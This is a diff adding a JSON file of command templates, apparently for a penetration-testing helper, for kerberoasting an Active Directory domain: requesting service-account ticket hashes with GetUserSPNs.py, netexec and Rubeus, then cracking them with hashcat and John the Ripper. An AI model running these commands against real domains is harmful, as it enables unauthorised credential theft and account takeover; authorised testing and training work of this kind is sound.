@@ -1,0 +1,29 @@
+{
+  "commands": [
+    {
+      "title": "Get User SPNs with GetUserSPNs.py",
+      "description": "Dump user SPNs to a file for kerberoasting using GetUserSPNs.py.",
+      "template": "GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip {ip} '{domain}/{username}:{password}'"
+    },
+    {
+      "title": "Kerberoasting with netexec ldap",
+      "description": "Perform kerberoasting using netexec ldap command.",
+      "template": "netexec ldap {targets} -u {username} -p {password} --kerberoasting kerberoastables.txt --kdcHost {ip}"
+    },
+    {
+      "title": "Kerberoasting using Rubeus.exe",
+      "description": "Dump kerberoast tickets using Rubeus tool.",
+      "template": "Rubeus.exe kerberoast /outfile:kerberoastables.txt"
+    },
+    {
+      "title": "Crack Kerberoast hashes with hashcat",
+      "description": "Use hashcat to crack Kerberos TGS hashes.",
+      "template": "hashcat -m 13100 kerberoastables.txt {wordlist}"
+    },
+    {
+      "title": "Crack Kerberoast hashes with John the Ripper",
+      "description": "Use John the Ripper to crack Kerberos TGS hashes.",
+      "template": "john --format=krb5tgs --wordlist={wordlist} kerberoastables.txt"
+    }
+  ]
+}
